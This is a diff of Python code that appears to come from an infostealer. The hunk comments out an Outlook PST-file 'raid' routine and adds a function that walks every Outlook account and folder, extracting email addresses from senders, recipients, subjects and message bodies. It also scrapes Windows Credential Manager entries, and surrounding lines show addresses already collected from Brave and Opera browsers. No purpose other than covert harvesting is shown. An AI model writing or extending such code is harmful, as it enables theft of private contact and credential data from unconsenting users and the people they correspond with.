@@ -735,52 +735,63 @@ emails.extend(brave_emails)
 emails.extend(gx_emails)
 emails.extend(opera_mails)
 
-try:
-    # Method 1: Outlook COM API
-    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-    for account in outlook.Accounts:
-        emails.append(account.CurrentUser.Address)
-    # Method 2: Raid PST files from registry
-    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Office\16.0\Outlook\Profiles')
-    for i in range(winreg.QueryInfoKey(reg_key)[0]):
-        subkey_name = winreg.EnumKey(reg_key, i)
-        subkey = winreg.OpenKey(reg_key, subkey_name)
-        try:
-            pst_path, _ = winreg.QueryValueEx(subkey, '001f6700')
-            with open(pst_path, 'rb') as f:
-                data = f.read()
-                emails.extend(re.findall(email_pattern.encode('utf-8'), data))
-        except: pass
-except: pass 
+# try:
+#     # Method 1: Outlook COM API
+#     outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
+#     for account in outlook.Accounts:
+#         emails.append(account.CurrentUser.Address)
+#     # Method 2: Raid PST files from registry
+#     reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Office\16.0\Outlook\Profiles')
+#     for i in range(winreg.QueryInfoKey(reg_key)[0]):
+#         subkey_name = winreg.EnumKey(reg_key, i)
+#         subkey = winreg.OpenKey(reg_key, subkey_name)
+#         try:
+#             pst_path, _ = winreg.QueryValueEx(subkey, '001f6700')
+#             with open(pst_path, 'rb') as f:
+#                 data = f.read()
+#                 emails.extend(re.findall(email_pattern.encode('utf-8'), data))
+#         except: pass
+# except: pass 
 
-try:
-    pythoncom.CoInitialize()
-    outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
-    inbox = outlook.GetDefaultFolder(6)  # 6 is the inbox folder
-    messages = inbox.Items
-    messages.Sort("[ReceivedTime]", True)
-    message = messages.GetLast()
-    while message:
-        try:
-            sender = getattr(message, 'SenderEmailAddress', '')  # Check if SenderEmailAddress exists
-            subject = getattr(message, 'Subject', '')  # Check if Subject exists
-            body = getattr(message, 'Body', '')  # Check if Body exists
-            emails.extend(re.findall(email_pattern, sender))
-            emails.extend(re.findall(email_pattern, subject))
-            emails.extend(re.findall(email_pattern, body))
-            message = messages.Previous()
-        except Exception as e:
-            print(f"Error processing message: {e}")
-            message = messages.Previous()
-            continue
-except Exception as e: print(f"Outlook COM API error: {e}") 
-finally: pythoncom.CoUninitialize()
+def fetch_out():
+    emails = []
+    try:
+        pythoncom.CoInitialize()
+        outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
+        folders = ["Inbox", "Sent Items", "Drafts", "Deleted Items", "Archive", "Junk Email", "Outbox", "Conversation History"]
 
+        for acc in outlook.Folders:
+            for folder in acc.Folders:
+                if folder.Name in folders:
+                    try:
+                        messages = folder.Items
+                        messages.Sort("[ReceivedTime]", True)
+                        print(f"ABOUT TO ENTER OUTLOOKK ! Has folder name: {folder.Name} for account: {acc.Name}")
+                        for message in messages:
+                            try:
+                                subject = message.Subject
+                                sender = message.SenderEmailAddress
+                                body = message.Body
+                                for reciptent in message.Recipients: emails.extend(re.findall(email_pattern, str(reciptent.Address)))
+                                emails.extend(re.findall(email_pattern, str(sender)))
+                                emails.extend(re.findall(email_pattern, str(subject)))
+                                emails.extend(re.findall(email_pattern, str(body)))
+                            except Exception as e:
+                                print(f"Error processing message: {e}")
+                    except Exception as e: print(f"Failed Iterating Folder Items: {e}")
+
+    except Exception as e: print(f"Outlook COM API error: {e}") 
+    finally: pythoncom.CoUninitialize()
+    return emails
+
+emails.extend(fetch_out())
 try:
     creds = win32cred.CredEnumerate(None, 0)
     for cred in creds:
-        emails.extend(re.findall(email_pattern, cred['TargetName']))
-        emails.extend(re.findall(email_pattern, cred['UserName']))
+        try:
+            emails.extend(re.findall(email_pattern, cred['TargetName']))
+            emails.extend(re.findall(email_pattern, cred['UserName']))
+        except: continue
 except Exception as e:
     print(f"ERROR FETCHING WIN CREDS : {e}")
     
